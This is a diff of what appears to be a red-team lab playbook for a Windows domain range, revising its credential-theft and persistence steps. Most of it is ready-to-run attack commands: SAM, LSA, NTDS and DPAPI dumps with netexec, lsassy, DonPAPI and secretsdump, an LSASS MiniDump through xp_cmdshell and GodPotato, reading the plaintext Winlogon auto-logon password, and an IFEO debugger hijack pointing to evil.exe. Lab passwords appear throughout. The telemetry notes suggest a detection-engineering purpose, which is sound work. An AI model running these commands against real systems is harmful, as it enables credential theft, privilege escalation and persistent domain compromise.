@@ -35,7 +35,7 @@ We have SYSTEM on mbr01. analyst_cloud has an active console session (auto-logon
 
 **Lab design:** LSASS PPL, VBS disabled via `04-vulnerabilities.yml`. In real Server 2025, LSASS dump would be blocked — 3.5A (Winlogon registry) or 3.5D (file delivery) would be primary paths.
 
-**Execution order:** 3.5F → 3.5A → 3.5G → 3.5H → 3.5B → 3.5C → 3.5D → 3.5E → 3.5I → 3.5J → 3.5K → 3.5L → 3.5M
+**Execution order:** 3.5F → 3.5A → 3.5G → 3.5H → 3.5C → 3.5D → 3.5E → 3.5I → 3.5J → 3.5K → 3.5L → 3.5M → 3.5O. (**3.5B removed — scheduled tasks are persistence-only, never execution wrappers. Rule 2.**)
 
 
 | Branch | Technique                        | Prerequisites                | Outcome                               |
@@ -44,8 +44,6 @@ We have SYSTEM on mbr01. analyst_cloud has an active console session (auto-logon
 | 3.5A   | Winlogon registry (plaintext)    | Auto-logon ON ✅              | analyst_cloud password                |
 | 3.5G   | Offensive DPAPI (Nemesis)        | Saved creds in profile       | DPAPI-decrypted credentials           |
 | 3.5H   | ctfmon.exe password extraction   | Typed passwords in CLI tools | SSH/WinSCP/MySQL passwords            |
-| 3.5B   | Scheduled task as analyst_cloud  | Password known               | SharpHound as analyst_cloud           |
-| 3.5B†  | Invisible scheduled tasks        | Task created                 | Task hidden from all tools            |
 | 3.5C   | RDP interactive session          | Password known               | Full SharpHound data                  |
 | 3.5D   | File detonation (H-01..H-06 / WT063-068) — post-exploit telemetry | User click                   | Telemetry demo                        |
 | 3.5E   | Logon trigger (Startup folder)   | User profile exists          | Auto-execution                        |
@@ -55,6 +53,7 @@ We have SYSTEM on mbr01. analyst_cloud has an active console session (auto-logon
 | 3.5L   | LAPS extraction ⏳                | Domain user creds            | Local admin password from AD          |
 | 3.5M   | Azure AD Connect DPAPI dump ⏳    | SYSTEM on dc01               | Cloud Sync creds → Entra ID bridge    |
 | 3.5N   | UnCanny LPE (InstallService) 🔬  | Standard user                | Direct SYSTEM via AppX InstallService |
+| 3.5O   | Persistence Extensions (DLL/COM/IFEO/LSA SSP) ⏳ | SYSTEM on mbr01              | Host persistence (WT104-107) |
 
 
 ---
@@ -69,48 +68,48 @@ Now we have `nt authority\system` on mbr01 (Phase 3 chain: SQL auth → xp_cmdsh
 
 ```bash
 # SAM database dump (local account hashes)
-nxc smb 192.168.77.22 -u Administrator -p 'Pwn3d_T2!' --sam
+nxc smb 192.168.77.22 -u analyst_t1 -p 'T13r_An@lyst!' --sam
 # Output: local Administrator + service account hashes (crackable)
 
 # LSA secrets dump (service account plaintext passwords)
-nxc smb 192.168.77.22 -u Administrator -p 'Pwn3d_T2!' --lsa
+nxc smb 192.168.77.22 -u analyst_t1 -p 'T13r_An@lyst!' --lsa
 # Output: DC$ machine account, MSSQL service account, possibly analyst_cloud plaintext
 
 # NTDS.dit dump (full domain hashes — DCSync equivalent)
-nxc smb 192.168.77.22 -u Administrator -p 'Pwn3d_T2!' --ntds
+nxc smb 192.168.77.22 -u analyst_t1 -p 'T13r_An@lyst!' --ntds
 # Output: ALL user + computer NTLM hashes for child.cadre.local
 
 # DPAPI secrets dump (Credential Manager, browser, WiFi)
-nxc smb 192.168.77.22 -u Administrator -p 'Pwn3d_T2!' --dpapi
+nxc smb 192.168.77.22 -u analyst_t1 -p 'T13r_An@lyst!' --dpapi
 
 # WinSCP saved session decryption (plaintext creds)
-nxc smb 192.168.77.22 -u Administrator -p 'Pwn3d_T2!' -M winscp
+nxc smb 192.168.77.22 -u analyst_t1 -p 'T13r_An@lyst!' -M winscp
 
 # LAPS password read (if mbr01 has LAPS configured)
-nxc ldap 192.168.77.11 -u Administrator -p 'Pwn3d_T2!' --laps
+nxc ldap 192.168.77.11 -u analyst_t1 -p 'T13r_An@lyst!' --laps
 ```
 
 **Alternative: lsassy** (per Campaign_suggestions.md #94 — 15+ LSASS dump methods):
 
 ```bash
 # From Kali against mbr01 (cleanest remote LSASS dump)
-lsassy -d child.cadre.local -u Administrator -p 'Pwn3d_T2!' 192.168.77.22
+lsassy -d child.cadre.local -u analyst_t1 -p 'T13r_An@lyst!' 192.168.77.22
 # Auto-picks best method (comsvcs, nanodump, procdump, dumpert, ppldump, silentprocessexit, sqldumper)
 # Returns NTLM hashes + Kerberos TGTs + CredMan + DPAPI master keys
 
 # Explicit method
-lsassy -m nanodump -d child.cadre.local -u Administrator -p 'Pwn3d_T2!' 192.168.77.22
+lsassy -m nanodump -d child.cadre.local -u analyst_t1 -p 'T13r_An@lyst!' 192.168.77.22
 ```
 
 **Alternative: DonPAPI** (per Campaign_suggestions.md #93 — DPAPI focus):
 
 ```bash
 # Auto-fetch Domain Backup Key + decrypt all DPAPI secrets
-donpapi collect -u child.cadre.local/Administrator -p 'Pwn3d_T2!' -d child.cadre.local -t 192.168.77.22
+donpapi collect -u child.cadre.local/analyst_t1 -p 'T13r_An@lyst!' -d child.cadre.local -t 192.168.77.22
 # Returns: Chrome/Firefox saved logins, CredMan entries, WiFi passwords, MobaXterm master key, mRemoteNG
 
 # Specific collectors only
-donpapi collect -u Administrator -p 'Pwn3d_T2!' -d child.cadre.local -t 192.168.77.22 --collectors Chromium,CredMan,WiFi
+donpapi collect -u analyst_t1 -p 'T13r_An@lyst!' -d child.cadre.local -t 192.168.77.22 --collectors Chromium,CredMan,WiFi
 ```
 
 **Alternative: Manual mimikatz** (full control, more steps):
@@ -130,11 +129,11 @@ dpapi::cred /in:C:\Users\analyst_cloud\AppData\Roaming\Microsoft\Credentials\<cr
 
 ```bash
 # From Kali
-impacket-secretsdump child.cadre.local/Administrator:'Pwn3d_T2!'@192.168.77.22 -just-dc-user krbtgt
+impacket-secretsdump child.cadre.local/analyst_t1:'T13r_An@lyst!'@192.168.77.22 -just-dc-user krbtgt
 # Returns: krbtgt hash + all hashes (need DCSync rights or local admin)
 
 # Full NTDS dump
-impacket-secretsdump child.cadre.local/Administrator:'Pwn3d_T2!'@192.168.77.22 -just-dc
+impacket-secretsdump child.cadre.local/analyst_t1:'T13r_An@lyst!'@192.168.77.22 -just-dc
 ```
 
 **Alternative: SharpHound** (for BloodHound collection as SYSTEM — gets more data):
@@ -175,7 +174,10 @@ SharpHound.exe -c All --zipfilename C:\Windows\Temp\sh.zip
 
 **Why this is primary:** LSASS PPL is OFF. analyst_cloud has auto-logon → Type 2/11 logon in LSASS. SYSTEM + procdump can dump the process and extract NTLM hash + Kerberos tickets offline.
 
-```bash
+**Verified automation:** `attack-matrix/04-automation/linux/campaign-a/T035-mbr01-creds-ws01.sh` stages the helper `campaign-a-t035-mbr01-creds.ps1` on `ws01` and runs it as `analyst_t1` via WinRM. The script uses `campaign-a-t043-system-exec.ps1` to execute `mimikatz.exe` as SYSTEM on `mbr01`, writes `C:\Windows\Temp\cadre-tools\cadre-mimi.log`, and pulls it back to `ws01`.
+
+**Alternative manual run:**
+
 **Step 1 — Copy procdump from `ws01` beachhead to `mbr01` via SMB (T1570):**
 
 ```powershell
@@ -191,9 +193,10 @@ Copy-Item -Path 'C:\Tools\ADTools\procdump.exe' -Destination '\\mbr01.child.cadr
 # Dump LSASS (attempt 1: direct)
 EXEC xp_cmdshell 'C:\Windows\Temp\cadre-tools\GodPotato-NET4.exe -cmd "cmd /c C:\Windows\Temp\cadre-tools\procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\cadre-tools\ls.dmp"';
 
-# If direct fails (token issue), use schtasks as SYSTEM
-EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c schtasks /create /tn CADRE-Procdump /ru SYSTEM /tr \"C:\Users\Public\procdump.exe -accepteula -ma lsass.exe C:\Users\Public\ls.dmp\" /sc once /st 00:00 /f"';
-EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c schtasks /run /tn CADRE-Procdump"';
+# If direct fails (token issue), use comsvcs.dll MiniDump as SYSTEM (no scheduled task — Rule 2)
+EXEC xp_cmdshell 'C:\Windows\Temp\cadre-tools\GodPotato.exe -cmd "cmd /c wmic process where name=\"lsass.exe\" get processid"';
+# → LSASS PID, then:
+EXEC xp_cmdshell 'C:\Windows\Temp\cadre-tools\GodPotato.exe -cmd "cmd /c C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\Windows\Temp\cadre-tools\ls.dmp full"';
 ```
 
 **Parse offline:**
@@ -212,7 +215,7 @@ pypykatz lsa minidump ls.dmp
 
 **Tool:** [lsassy v3.1.16](https://github.com/login-securite/lsassy) (Mar 23 2026) — 15+ LSASS dump methods in one tool. Also available as NetExec module.
 
-**Why this alternative:** lsassy automates dump method selection. Auto-picks the best method per target (comsvcs, procdump, nanodump, dumpert, ppldump, silentprocessexit, etc.). More reliable than manual procdump + schtasks.
+**Why this alternative:** lsassy automates dump method selection. Auto-picks the best method per target (comsvcs, procdump, nanodump, dumpert, ppldump, silentprocessexit, etc.). More reliable than manual procdump direct.
 
 ```bash
 # From Kali against mbr01 (with admin creds from Phase 3 SQL chain)
@@ -231,7 +234,7 @@ lsassy -m nanodump -d child.cadre.local -u analyst_t1 -p 'T13r_An@lyst!' 192.168
 - Should work in our lab since LSASS PPL is OFF (per `04-vulnerabilities.yml`)
 - Best run from Kali to mbr01 (avoids AV/EDR issues on the target)
 
-**When to use this over 3.5F:** Use lsassy when you want cleaner logon + better evasion. Use manual procdump + schtasks (3.5F) when you need to capture a specific process access pattern for testing detection rules.
+**When to use this over 3.5F:** Use lsassy when you want cleaner logon + better evasion. Use manual procdump / comsvcs direct (3.5F) when you need to capture a specific process access pattern for testing detection rules. (No scheduled-task fallback — Rule 2.)
 
 **Telemetry:** Same as 3.5F — Sysmon EID 10 (LSASS access), EID 1 (dump method binary), WinSec 4663. Telemetry fingerprint identical for detection engineering purposes.
 
@@ -300,15 +303,19 @@ KrbRelayUp.exe relay -d child.cadre.local -cn "EVILBOX$" -cp "Pwn3dByR3lay!" -l 
 
 **Why backup:** If LSASS dump fails, auto-logon stores the password in plaintext in the registry. This is misconfiguration discovery — same class as GPP cpassword, unattended.xml, service account strings in registry.
 
+**Verified automation:** `attack-matrix/04-automation/linux/campaign-a/T035A-winlogon-creds-ws01.sh` stages `campaign-a-t035a-winlogon-creds.ps1` on `ws01` and runs it as `analyst_t1` via WinRM. The script uses `campaign-a-t043-system-exec.ps1` to read `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` as SYSTEM on `mbr01` and returns the plaintext auto-logon credentials. **Confirmed output:** `CADRE\analyst_cloud:Cl0ud_An@lyst!`.
+
+**Manual run:**
+
 ```bash
-# Read auto-logon credentials from SYSTEM
-EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v DefaultUserName"';
+# Read auto-logon credentials from SYSTEM via the SQL → GodPotato channel
+EXEC xp_cmdshell 'C:\Windows\Temp\cadre-tools\GodPotato.exe -cmd "cmd /c reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v DefaultUserName"';
 -- → analyst_cloud
 
-EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v DefaultPassword"';
+EXEC xp_cmdshell 'C:\Windows\Temp\cadre-tools\GodPotato.exe -cmd "cmd /c reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v DefaultPassword"';
 -- → Cl0ud_An@lyst!
 
-EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v DefaultDomainName"';
+EXEC xp_cmdshell 'C:\Windows\Temp\cadre-tools\GodPotato.exe -cmd "cmd /c reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v DefaultDomainName"';
 -- → CADRE
 ```
 
@@ -368,27 +375,22 @@ EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c C:\Users\Public\pro
 
 ---
 
-#### 3.5B — Scheduled Task as analyst_cloud (Post-Credential)
+#### 3.5B — Scheduled Task as analyst_cloud (Post-Credential) ❌ REJECTED FOR ATTACK CHAIN
+
+> **Attacker realism note (Rule 2 — locked 2026-07-31):** Attackers do not create scheduled tasks to **run** attack tools. Scheduled tasks are a persistence technique, not an execution wrapper. The credential-theft phase should produce credentials; the next phase uses those credentials directly (WinRS, PsExec, runas, RDP, etc.) rather than hiding tool execution inside a task. Scheduled tasks are valid **only as persistence mechanisms** (e.g. the invisible-task variant below, Phase 5).
 
 **Prerequisite:** Password known from 3.5A or 3.5F.
 
-**Best spine fit after 3.5A** — once password is known, create a scheduled task running as analyst_cloud:
+**Preferred follow-on:** Use `analyst_cloud` credentials directly to run SharpHound via WinRS/PsExec from `ws01` (T102 lateral movement), or run SharpHound from the compromised `mbr01` interactive session. See T004 (Branch 4 / Phase 3.5 continuation) and T102 (Phase 5).
+
+**What NOT to do:**
 
 ```bash
-# Create task running as analyst_cloud
-EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c schtasks /create /tn CADRE-SharpHound /tr \"C:\Tools\SharpHound.exe -c All -d child.cadre.local --outputdirectory C:\Users\analyst_cloud\Documents\" /sc once /st 00:00 /ru CADRE\analyst_cloud /rp Cl0ud_An@lyst! /f"';
-
-# Run the task
-EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c schtasks /run /tn CADRE-SharpHound"';
+# Do NOT use scheduled tasks to run SharpHound during active attack chain
+EXEC xp_cmdshell 'C:\Windows\Temp\cadre-tools\GodPotato.exe -cmd "cmd /c schtasks /create /tn CADRE-SharpHound /tr \"C:\Windows\Temp\cadre-tools\SharpHound.exe -c All -d child.cadre.local --outputdirectory C:\Users\analyst_cloud\Documents\" /sc once /st 00:00 /ru CADRE\analyst_cloud /rp Cl0ud_An@lyst! /f"';
 ```
 
-**SharpHound binary staging:** Copy `SharpHound.exe` from the `ws01` beachhead (`C:\Tools\ADTools`) to `mbr01` (`C:\Tools\SharpHound.exe`) via SMB (T1570) before creating the task. The scheduled task should execute the already-staged binary, not download it.
-
-**Alternatives:** PsExec, WMI, runas (non-interactive with password pipe).
-
 **Telemetry:** 4698 (task create), 4699 (task run), 4624 with TargetUserName=analyst_cloud, Sysmon 1 parent = svchost.exe/taskeng.exe.
-
-**Playbook anchor:** `06-member-services.yml` — auto-logon password + `C:\Tools` directory.
 
 ##### Invisible Scheduled Tasks (Security Descriptor Deletion)
 
@@ -424,6 +426,10 @@ EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c schtasks /run /tn C
 ---
 
 #### 3.5C — RDP Interactive Session (Full SharpHound)
+
+**Verified automation:** `attack-matrix/04-automation/linux/campaign-a/T004-mbr01-bh-ws01.sh` stages `campaign-a-t004-mbr01-bh.ps1` on `ws01` and runs it as `analyst_t1` via WinRM. The script uses `campaign-a-t043-system-exec.ps1` to run `SharpHound.exe` as SYSTEM on `mbr01`, writes the zip to `C:\Windows\Temp\cadre-tools`, grants read ACL, and pulls it back to `ws01`.
+
+**Manual run:**
 
 **From Kali after 3.5A** (password known):
 
@@ -589,6 +595,29 @@ WerFaultSecure is a Microsoft-signed binary that can dump LSASS memory. Stealthi
 **Detection:** Sysmon EID 1 (WerFaultSecure.exe with LSASS target), EID 11 (dump file creation).
 
 ---
+
+#### 3.5O — Persistence Extension Set: DLL/COM/IFEO/LSA SSP (WT104-107) ⏳
+
+**Source:** Zero Point Security RTO — Windows Persistence. Adds four host-persistence primitives to the Branch 3.5 persistence surface (3.5J WMI + invisible tasks). Adopted 2026-08-02 from `Campaign_suggestions.md` upgrade candidates.
+
+| WT# | Technique | MITRE | What it does |
+|-----|-----------|-------|--------------|
+| 104 | DLL Hijacking | T1574.001 | Plant malicious DLL in a trusted app's search path (ws01/mbr01) — code runs in the app's context on launch |
+| 105 | COM Hijacking | T1546.015 | Repoint a COM object's `LocalServer32`/`InprocServer32` to attacker DLL — fires on COM activation |
+| 106 | IFEO (Image File Execution Options) | T1546.012 | `Debugger` value on a target exe → attacker binary runs instead (or `GlobalFlag`/`SilentProcessExit`) |
+| 107 | LSA SSP / Password Filter | T1547.005 | Register malicious SSP — loads into LSASS, captures cleartext credentials on logon |
+
+```powershell
+# WT106 IFEO (SYSTEM on mbr01)
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /t REG_SZ /d "C:\Windows\Temp\cadre-tools\evil.exe" /f
+# WT107 LSA SSP (SYSTEM on mbr01) — copy ssp.dll to System32 + add to Security Packages registry value
+```
+
+**Test:** each on mbr01 (SYSTEM via SQL→GodPotato chain); verify persistence survives reboot; document telemetry (Sysmon EID 11/12/13, EID 1 for IFEO debugger, LSASS module load EID 7).
+
+**Detection:** Sysmon EID 7 (LSASS image load — SSP), EID 12/13 (registry persistence keys), EID 11 (DLL drop); WinSec 4688 for IFEO-spawned processes.
+
+**Cross-refs:** `Campaign_suggestions` Phase 5 persistence; extends 3.5J (WMI) + invisible tasks (3.5B persistence variant).
 
 #### 3.5L — LAPS Extraction (T1552.004) ⏳
 
